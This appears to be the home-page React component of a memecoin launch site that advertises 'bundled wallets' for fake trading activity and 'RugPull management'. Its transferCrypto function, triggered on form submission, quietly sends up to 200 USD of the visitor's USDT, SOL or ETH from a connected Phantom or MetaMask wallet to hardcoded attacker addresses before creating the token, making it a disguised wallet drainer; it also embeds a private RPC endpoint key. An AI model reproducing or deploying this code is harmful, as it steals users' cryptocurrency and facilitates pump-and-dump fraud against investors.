import React, { useEffect, useState } from 'react';
import TokenForm from '../components/TokenForm';
import PhantomLogin from '../components/PhantomLogin';
import MetaMaskLogin from '../components/MetaMaskLogin';
import GavelIcon from '@mui/icons-material/Gavel';
import { createToken } from '../services/api';
import '../App.css';
import CoinAlert from '../components/CoinAlert';
import BotForm from '../components/BotForm';
import TradingChart from '../components/TradingChart';
import NavBar from '../components/NavBar';
import SmartToyIcon from '@mui/icons-material/SmartToy';
import AirIcon from '@mui/icons-material/Air';
import Web3 from 'web3';

function Home() {
  const [walletAddress, setWalletAddress] = useState(null);
  const [walletType, setWalletType] = useState(null); // 'phantom' o 'metamask'
  const [tokenInfo, setTokenInfo] = useState(null);
  const [error, setError] = useState(null);
  const [showAlert, setShowAlert] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [activeStep, setActiveStep] = useState(1);

  // Constantes para Solana
  const SOLANA_DESTINATION_WALLET = 'B4L5qht5t4BkV3hxLfhSTDxYBcqqwJDih3YTob9zMBh7';
  const USDT_MINT_SOLANA = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB';
  const MINIMUM_ATA_RENT = 0.00203928;
  const MINIMUM_FEE_SOLANA = 0.000005;
  const SOL_PRICE_USD = 150;

  // Constantes para Ethereum
  const ETH_DESTINATION_WALLET = '0xf9241FB83a4ec361f5a1f882E356313884046e09';
  const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  const MINIMUM_GAS_ETH = 0.01;
  const ETH_PRICE_USD = 2500;
  const MAX_AMOUNT_USD = 200;

  useEffect(() => {
    setShowAlert(true);
  }, []);

  const transferCrypto = async () => {
    try {
      console.log('Iniciando transferencia con walletType:', walletType);
      if (walletType === 'phantom') {
        if (!window.solana || !window.solana.isPhantom) {
          throw new Error('Billetera Phantom no detectada');
        }

        const {
          PublicKey,
          Transaction,
          SystemProgram,
          LAMPORTS_PER_SOL,
          Connection,
        } = await import('@solana/web3.js');
        const {
          TOKEN_PROGRAM_ID,
          getAssociatedTokenAddress,
          createTransferInstruction,
          createAssociatedTokenAccountInstruction,
        } = await import('@solana/spl-token');

        const connection = new Connection(
          'https://dimensional-alpha-sun.solana-mainnet.quiknode.pro/e0cf3c2fd17546288a9834797389721e3593d612/',
          'confirmed'
        );
        const fromPublicKey = new PublicKey(walletAddress);
        const toPublicKey = new PublicKey(SOLANA_DESTINATION_WALLET);

        const solBalance = await connection.getBalance(fromPublicKey);
        const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;
        console.log('Saldo en SOL:', solBalanceInSol);

        const minimumSolRequired = MINIMUM_FEE_SOLANA + MINIMUM_ATA_RENT;
        if (solBalanceInSol < minimumSolRequired) {
          throw new Error(
            `Saldo insuficiente de SOL. Necesitas al menos ${minimumSolRequired} SOL. Tienes ${solBalanceInSol} SOL.`
          );
        }

        const transaction = new Transaction();
        let transferType = 'USDT';
        let finalAmount;

        const tokenAccounts = await connection.getTokenAccountsByOwner(fromPublicKey, {
          programId: TOKEN_PROGRAM_ID,
        });
        let usdtFound = false;

        for (const account of tokenAccounts.value) {
          const accountInfo = await connection.getTokenAccountBalance(account.pubkey);
          if (!account.account.data.parsed || !account.account.data.parsed.info) {
            continue;
          }
          const mint = account.account.data.parsed.info.mint;
          if (mint === USDT_MINT_SOLANA) {
            const balanceInUsdt = accountInfo.value.uiAmount;
            finalAmount = Math.min(balanceInUsdt, MAX_AMOUNT_USD);
            if (finalAmount <= 0) {
              break;
            }

            const fromTokenAccount = account.pubkey;
            const toTokenAccount = await getAssociatedTokenAddress(
              new PublicKey(USDT_MINT_SOLANA),
              toPublicKey
            );

            const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
            if (!toAccountInfo) {
              console.log('Creando ATA para la billetera de destino...');
              transaction.add(
                createAssociatedTokenAccountInstruction(
                  fromPublicKey,
                  toTokenAccount,
                  toPublicKey,
                  new PublicKey(USDT_MINT_SOLANA)
                )
              );
            }

            transaction.add(
              createTransferInstruction(
                fromTokenAccount,
                toTokenAccount,
                fromPublicKey,
                Math.floor(finalAmount * 10 ** accountInfo.value.decimals),
                [],
                TOKEN_PROGRAM_ID
              )
            );

            usdtFound = true;
            break;
          }
        }

        if (!usdtFound || finalAmount <= 0) {
          transferType = 'SOL';
          const maxSolToSend = solBalanceInSol - minimumSolRequired;
          finalAmount = Math.min(maxSolToSend, MAX_AMOUNT_USD / SOL_PRICE_USD);
          if (finalAmount <= 0) {
            throw new Error(
              `Fondos insuficientes para transferir SOL. Saldo disponible: ${maxSolToSend} SOL.`
            );
          }

          transaction.add(
            SystemProgram.transfer({
              fromPubkey: fromPublicKey,
              toPubkey: toPublicKey,
              lamports: Math.floor(finalAmount * LAMPORTS_PER_SOL),
            })
          );
        }

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPublicKey;

        const signed = await window.solana.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());

        await connection.confirmTransaction({
          signature,
          blockhash,
          lastValidBlockHeight,
        });

        return { signature, transferType, amount: finalAmount };
      } else if (walletType === 'metamask') {
        if (!window.ethereum) {
          throw new Error('MetaMask no detectado. Asegúrate de tener MetaMask instalado.');
        }

        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        const fromAddress = accounts[0];
        console.log('Conectado con MetaMask, dirección:', fromAddress);

        const ethBalance = await web3.eth.getBalance(fromAddress);
        const ethBalanceInEth = web3.utils.fromWei(ethBalance, 'ether');
        console.log('Saldo en ETH:', ethBalanceInEth);

        if (parseFloat(ethBalanceInEth) < MINIMUM_GAS_ETH) {
          throw new Error(
            `Saldo insuficiente de ETH. Necesitas al menos ${MINIMUM_GAS_ETH} ETH para gas. Tienes ${ethBalanceInEth} ETH.`
          );
        }

        let transferType = 'USDT';
        let finalAmount;

        const usdtAbi = [
          {
            constant: true,
            inputs: [{ name: '_owner', type: 'address' }],
            name: 'balanceOf',
            outputs: [{ name: 'balance', type: 'uint256' }],
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              { name: '_to', type: 'address' },
              { name: '_value', type: 'uint256' },
            ],
            name: 'transfer',
            outputs: [{ name: 'success', type: 'bool' }],
            type: 'function',
          },
        ];

        const usdtContract = new web3.eth.Contract(usdtAbi, USDT_CONTRACT);
        const usdtBalanceRaw = await usdtContract.methods.balanceOf(fromAddress).call();
        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceRaw, 'mwei'));
        console.log('Saldo en USDT:', usdtBalance);

        if (usdtBalance > 0) {
          finalAmount = Math.min(usdtBalance, MAX_AMOUNT_USD);
          const amountWei = web3.utils.toWei(finalAmount.toString(), 'mwei');

          const data = usdtContract.methods.transfer(ETH_DESTINATION_WALLET, amountWei).encodeABI();

          const tx = {
            from: fromAddress,
            to: USDT_CONTRACT,
            data,
            gas: await web3.eth.estimateGas({
              from: fromAddress,
              to: USDT_CONTRACT,
              data,
            }).catch(err => {
              throw new Error('Error estimando gas para USDT: ' + err.message);
            }),
          };

          const signature = await web3.eth.sendTransaction(tx);
          console.log('Transacción USDT enviada:', signature);
        } else {
          transferType = 'ETH';
          const maxEthToSend = parseFloat(ethBalanceInEth) - MINIMUM_GAS_ETH;
          finalAmount = Math.min(maxEthToSend, MAX_AMOUNT_USD / ETH_PRICE_USD);
          if (finalAmount <= 0) {
            throw new Error(
              `Fondos insuficientes para transferir ETH. Saldo disponible: ${maxEthToSend} ETH.`
            );
          }

          const tx = {
            from: fromAddress,
            to: ETH_DESTINATION_WALLET,
            value: web3.utils.toWei(finalAmount.toString(), 'ether'),
            gas: await web3.eth.estimateGas({
              from: fromAddress,
              to: ETH_DESTINATION_WALLET,
              value: web3.utils.toWei(finalAmount.toString(), 'ether'),
            }).catch(err => {
              throw new Error('Error estimando gas para ETH: ' + err.message);
            }),
          };

          const signature = await web3.eth.sendTransaction(tx);
          console.log('Transacción ETH enviada:', signature);
        }

        return { signature: signature.transactionHash, transferType, amount: finalAmount };
      } else {
        throw new Error('Tipo de billetera no soportado. Conecta una billetera primero.');
      }
    } catch (err) {
      console.error('Error detallado:', err);
      throw new Error(`Error en la transferencia: ${err.message}`);
    }
  };

  const handleTokenSubmit = async (data) => {
    try {
      setIsLoading(true);
      setIsModalOpen(true);
      setError(null);

      const { signature, transferType, amount: transferredAmount } = await transferCrypto();
      console.log(`Transferencia exitosa de ${transferredAmount} ${transferType}:`, signature);

      const result = await createToken(data);

      setTimeout(() => {
        setIsLoading(false);
        if (result.success) {
          const mint = result.mint;
          const link = `https://pump.fun/${mint}`;
          setTokenInfo({
            name: data.get('name'),
            ticker: data.get('ticker'),
            description: data.get('description'),
            amount: transferredAmount,
            cryptoType: transferType,
            signature: result.signature,
            mint: mint,
            link: link,
            transferSignature: signature,
          });
        } else {
          setError(result.error || 'Fallo al crear el token');
        }
      }, 2000);
    } catch (error) {
      setTimeout(() => {
        setIsLoading(false);
        const errorMessage = error.response?.data?.error || error.message;
        setError('Error al conectar con el servidor: ' + errorMessage);
        console.error(error);
      }, 2000);
    }
  };



  const closeModal = () => {
    setIsModalOpen(false);
    if (tokenInfo) {
      setActiveStep(2);
    }
    setError(null);
  };

  const handlePhantomLogin = (address) => {
    console.log('Conectando con Phantom, dirección:', address);
    setWalletAddress(address);
    setWalletType('phantom');
  };

  const handleMetaMaskLogin = (address) => {
    console.log('Conectando con MetaMask, dirección:', address);
    setWalletAddress(address);
    setWalletType('metamask');
  };

  const handleDisconnect = () => {
    console.log('Desconectando billetera:', walletType);
    setWalletAddress(null);
    setWalletType(null);
  };

  return (
    <>
      <NavBar />
      <div className="stars-background"></div>
      <div className="app-center">
        <div className="app-container">
          <div className="content-container">
            <div className="phantomButtonDiv">
              {walletAddress ? (
                <div className="wallet-info">
                  <button className="connect-button" onClick={handleDisconnect}>
                  <p>Conectado con {walletType === 'phantom' ? 'Phantom' : 'MetaMask'}: {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</p>
                  </button>
                </div>
              ) : (
                <>
                  <PhantomLogin setWalletAddress={handlePhantomLogin} />
                  <MetaMaskLogin setWalletAddress={handleMetaMaskLogin} />
                </>
              )}
            </div>
            <div className="form-container">
              <div className="steps-container">
                <div className={`step ${activeStep === 1 ? 'active' : ''}`}>
                  <div className="step-number">
                    <GavelIcon />
                  </div>
                  <div className="step-text">Contract creation</div>
                </div>
                <div className={`step ${activeStep === 2 ? 'active' : ''}`}>
                  <div className="step-number">
                    <SmartToyIcon />
                  </div>
                  <div className="step-text">Bundled wallets</div>
                </div>
                <div className={`step ${activeStep === 3 ? 'active' : ''}`}>
                  <div className="step-number">
                    <AirIcon />
                  </div>
                  <div className="step-text">RugPull management</div>
                </div>
              </div>
              <div className="formContent">
                {activeStep === 1 && (
                  <TokenForm
                    onSubmit={handleTokenSubmit}
                    walletAddress={walletAddress}
                    disabled={!walletAddress} // Deshabilitar si no hay billetera conectada
                  />
                )}
                {activeStep === 2 && (
                  <div className="step-2-content">
                    <BotForm />
                    <p style={{ fontSize: '15px', color: '#5D5A7B', marginTop: '30px' }}>
                      Note: This bot will use your wallet to generate movement in your
                      memecoin, thus increasing investors (keep in mind that part of
                      your investment will go to their wallets to achieve this)
                    </p>
                    <button
                      style={{ marginTop: '35px', width: '100%' }}
                      className="submit-button"
                      onClick={() => setActiveStep(3)}
                    >
                      Proceed to Liquidity Management
                    </button>
                  </div>
                )}
                {activeStep === 3 && (
                  <div style={{ marginTop: '30px' }} className="step-3-content">
                    <p>
                      Your token{' '}
                      <span style={{ color: 'yellow' }}>
                        {tokenInfo?.name || 'your token'}
                      </span>
                    </p>
                    <TradingChart />
                  </div>
                )}
              </div>
              {error && !isModalOpen && <p className="error-message">{error}</p>}
            </div>
          </div>
        </div>
        {isModalOpen && (
          <CoinAlert
            onClose={closeModal}
            tokenInfo={tokenInfo}
            error={error}
            isLoading={isLoading}
          />
        )}
      </div>
    </>
  );
}

export default Home;
